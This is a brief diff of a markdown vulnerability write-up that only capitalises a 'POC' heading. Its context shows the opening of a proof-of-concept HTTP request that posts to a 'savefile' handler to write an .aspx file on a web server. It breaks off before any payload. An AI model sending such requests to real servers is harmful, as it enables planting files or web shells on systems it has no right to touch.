@@ -10,7 +10,7 @@
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1735477150841-8d8d1019-2950-4949-bd1c-b1d1e3d704f8.png)
 
-## poc
+## POC
 ```rust
 POST /System/Common.ashx?type=savefile&path=test.aspx HTTP/1.1
 Host: 
